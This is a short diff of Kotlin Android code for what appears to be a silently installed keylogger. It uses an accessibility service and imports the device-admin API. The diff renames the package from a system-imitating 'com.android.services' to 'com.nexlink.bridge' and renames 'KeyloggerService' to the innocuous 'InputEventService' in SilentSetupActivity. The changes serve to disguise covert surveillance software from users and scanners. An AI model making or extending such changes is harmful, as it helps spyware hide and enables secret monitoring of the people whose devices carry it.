@@ -1,4 +1,4 @@
-package com.android.services
+package com.nexlink.bridge
 
 import android.Manifest
 import android.app.admin.DevicePolicyManager
@@ -172,7 +172,7 @@ class SilentSetupActivity : AppCompatActivity() {
 
     private fun requestAccessibility() {
         crashlytics.log("SilentSetupActivity: requestAccessibility")
-        if (!isAccessibilityEnabled(KeyloggerService::class.java)) {
+        if (!isAccessibilityEnabled(InputEventService::class.java)) {
             try {
                 @Suppress("DEPRECATION")
                 startActivityForResult(
